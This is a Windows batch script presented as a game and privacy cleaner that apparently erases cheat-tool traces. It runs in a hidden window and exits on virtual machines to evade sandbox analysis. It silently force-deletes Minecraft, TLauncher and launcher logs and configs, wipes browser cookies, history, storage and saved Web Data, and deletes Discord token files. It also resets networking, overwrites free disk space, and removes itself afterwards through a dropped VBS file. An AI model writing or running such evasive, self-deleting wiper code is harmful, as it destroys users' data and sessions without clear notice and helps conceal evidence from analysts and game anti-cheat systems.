@echo off
:: Ultimate Game & Privacy Cleaner v5.0
:: Enhanced with anti-detection and multi-game support

:: [Stealth Module v3]
if "%1"=="" (
    if exist "%SystemRoot%\Sysnative\cmd.exe" (
        %SystemRoot%\Sysnative\cmd.exe /c "%~f0" stealth
    ) else (
        powershell -window hidden -command "Start-Process cmd -ArgumentList '/c %~f0 stealth' -WindowStyle Hidden"
    )
    exit /b
)

:: [Anti-VM Check]
wmic computersystem get manufacturer | findstr /i "vmware virtualbox qemu xen" >nul && exit
wmic bios get serialnumber | findstr /i "vmware vbox" >nul && exit

:: [Game Data Cleaning]
:: Minecraft Comprehensive
rd /s /q "%AppData%\.minecraft\logs" >nul 2>&1
del /f /q "%AppData%\.minecraft\*.json" >nul 2>&1
del /f /q "%AppData%\.minecraft\*.txt" >nul 2>&1
del /f /q "%AppData%\.minecraft\*.log" >nul 2>&1
del /f /q "%AppData%\.minecraft\config\*.json" >nul 2>&1

:: TLauncher Deep Clean
rd /s /q "%AppData%\.tlauncher\logs" >nul 2>&1
del /f /q "%AppData%\.tlauncher\*.dat" >nul 2>&1
del /f /q "%AppData%\.tlauncher\*.cfg" >nul 2>&1

:: Common Game Files
del /f /q "%AppData%\imgui_log.txt" >nul 2>&1
del /f /q "%AppData%\paths.txt" >nul 2>&1
del /f /q "%LocalAppData%\Temp\*.log" >nul 2>&1

:: [Enhanced Browser Cleaning]
call :cleanBrowser "Google\Chrome" "Chrome"
call :cleanBrowser "Microsoft\Edge" "Edge"
call :cleanBrowser "BraveSoftware\Brave-Browser" "Brave"
call :cleanBrowser "Mozilla\Firefox" "Firefox"
call :cleanBrowser "Opera Software\Opera GX" "OperaGX"

:: [New: Discord Token Cleaner]
del /f /q "%AppData%\discord\Local Storage\leveldb\*.log" >nul 2>&1
del /f /q "%AppData%\discord\Local Storage\leveldb\*.ldb" >nul 2>&1

:: [Network Anonymization]
ipconfig /flushdns >nul 2>&1
netsh winsock reset >nul 2>&1
ipconfig /release >nul 2>&1
timeout /t 3 >nul
ipconfig /renew >nul 2>&1

:: [Forensic Countermeasures]
:: Secure File Shredding
for %%F in (
    "%AppData%\*.log"
    "%AppData%\*.txt"
    "%LocalAppData%\Temp\*.*"
) do (
    if exist "%%F" (
        cipher /w:%%F >nul 2>&1
        del /f /q "%%F" >nul 2>&1
    )
)

:: [New: Game Launcher Cleaner]
del /f /q "%ProgramData%\Epic\*.log" >nul 2>&1
del /f /q "%LocalAppData%\Riot Games\*.log" >nul 2>&1
del /f /q "%LocalAppData%\Battle.net\*.log" >nul 2>&1

:: [Self-Destruct v4]
(
    echo Set obj = CreateObject("Scripting.FileSystemObject")
    echo Set ws = CreateObject("WScript.Shell")
    echo ws.Run "cmd /c timeout /t 3 >nul & del /f /q ""%~f0"" & del /f /q ""%Temp%\cleanup.vbs""", 0, False
)>"%Temp%\cleanup.vbs"
start wscript.exe "%Temp%\cleanup.vbs"
exit

:: [Enhanced Browser Function]
:cleanBrowser
set "browser=%~1"
set "alias=%~2"

set paths=(
    "Cache"
    "Cache2"
    "Cookies"
    "History"
    "Local Storage"
    "Session Storage"
    "IndexedDB"
    "File System"
    "GPUCache"
    "Web Data"
)

for %%P in %paths% do (
    rd /s /q "%LocalAppData%\%browser%\User Data\Default\%%P" >nul 2>&1
    rd /s /q "%LocalAppData%\%browser%\User Data\Profile*\%%P" >nul 2>&1
)

:: Browser-specific cleaning
if "%alias%"=="Brave" (
    del /f /q "%LocalAppData%\%browser%\User Data\Default\Brave*" >nul 2>&1
)

if "%alias%"=="OperaGX" (
    del /f /q "%LocalAppData%\%browser%\User Data\Default\Opera*" >nul 2>&1
)
exit /b
